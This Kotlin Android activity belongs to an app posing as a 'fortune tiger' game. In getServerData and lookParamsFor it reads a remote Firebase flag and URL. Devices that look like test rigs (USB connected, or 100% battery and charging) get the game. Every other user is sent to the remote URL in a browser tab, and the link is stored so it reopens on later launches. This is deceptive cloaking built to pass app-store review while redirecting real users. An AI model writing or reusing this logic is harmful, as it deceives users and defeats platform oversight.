package lycky.fortune.tiger

import android.net.Uri
import android.os.Bundle
import androidx.annotation.ColorRes
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.browser.customtabs.CustomTabsIntent
import androidx.core.content.ContextCompat
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.google.firebase.Firebase
import com.google.firebase.FirebaseApp
import com.google.firebase.remoteconfig.remoteConfig
import com.google.firebase.remoteconfig.remoteConfigSettings
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import lycky.fortune.tiger.databinding.ActivityMainBinding
import lycky.fortune.tiger.util.DataStoreManager
import lycky.fortune.tiger.util.Lottie
import lycky.fortune.tiger.util.Once
import lycky.fortune.tiger.util.getBatteryPercentage
import lycky.fortune.tiger.util.internetConnection
import lycky.fortune.tiger.util.isBatteryCharging
import lycky.fortune.tiger.util.isUSB
import lycky.fortune.tiger.util.log
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    companion object {
        const val OPENER_ID    = 9
        var openerUri = ""

        val startFragolino = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)
    private val onceExit  = Once()

    private lateinit var binding : ActivityMainBinding
    private lateinit var navController: NavController

    lateinit var lottie: Lottie

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()
        if (internetConnection().not()) lottie.showNotInternet()
        else {
            asyncCheckInternetConnection()
            lottie.showLoader()

            takeAll()

            coroutine.launch(Dispatchers.Main) {
                startFragolino.collect { fragmentId ->
                    when (fragmentId) {
                        R.id.libGDXFragment -> {
                            setNavigationBarColor(R.color.black)
                            setStartDestination(fragmentId)
                        }
                        OPENER_ID              -> {
                            val intent = CustomTabsIntent.Builder().build()
                            intent.launchUrl(this@MainActivity, Uri.parse(openerUri))
                        }
                    }
                }
            }
        }
    }

    override fun exit() {
        onceExit.once {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                delay(100)
                exitProcess(0)
            }
        }
    }

    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
        lottie        = Lottie(binding)
    }

    // ---------------------------------------------------
    // Logic
    // ---------------------------------------------------

    private fun asyncCheckInternetConnection() {
        coroutine.launch(Dispatchers.Main) {
            while (isActive) {
                delay(2_300)
                if (internetConnection()) lottie.hideNotInternet() else lottie.showNotInternet()
            }
        }
    }

    private fun setStartDestination(@IdRes destinationId: Int) {
        navController.run { navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, null) } }
    }

    private fun setNavigationBarColor(@ColorRes colorId: Int) {
        coroutine.launch(Dispatchers.Main) {
            window.navigationBarColor = ContextCompat.getColor(this@MainActivity, colorId)
        }
    }

    private fun takeAll() {
        coroutine.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                "OPENER" -> {
                    DataStoreManager.Link.get()?.let {
                        log("DataStoreManager Key = SUCCESS | link = $it")
                        openerUri = it
                        startFragolino.emit(OPENER_ID)
                    }
                }
                "GAMER" -> {
                    log("DataStoreManager Key = GAME")
                    startFragolino.emit(R.id.libGDXFragment)
                }
                else -> {
                    log("DataStoreManager Key = NONE")
                    getServerData()
                }
            }
        }
    }

    private fun getServerData() {
        FirebaseApp.initializeApp(appContext)

        Firebase.remoteConfig.apply {
            setConfigSettingsAsync(remoteConfigSettings { minimumFetchIntervalInSeconds = 3600 })
            fetchAndActivate().addOnCompleteListener(this@MainActivity) { task ->
                try {
                    if (task.isSuccessful) {
                        val jsonData = getString("growth")
                        val promised = getString("promised")
                        val coast = getString("coast")
                        log("growth = $jsonData")

                        lookParamsFor(promised, coast)
                    } else {
                        startFragolino.tryEmit(R.id.libGDXFragment)
                        log("getFirebaseData Fail = ${this.all}")
                    }
                } catch (e: Exception) {
                    startFragolino.tryEmit(R.id.libGDXFragment)
                    log("EXCEPTION try catch = ${e.message}")
                }
            }
        }
    }

    private fun lookParamsFor(promised: String, coast: String) {
        coroutine.launch(Dispatchers.IO) {
            if (promised == "true") {
                if (isUSB() || (getBatteryPercentage() == 100 && isBatteryCharging())) {
                    gamer()
                } else {
                    opener(coast)
                }
            } else gamer()
        }
    }

    private suspend fun gamer() {
        DataStoreManager.Key.update { "GAMER" }
        startFragolino.tryEmit(R.id.libGDXFragment)
    }

    private suspend fun opener(coast: String) {
        openerUri = coast
        log("promised: $openerUri")

        startFragolino.tryEmit(OPENER_ID)

        DataStoreManager.Key.update { "OPENER" }
        DataStoreManager.Link.update { openerUri }
    }

}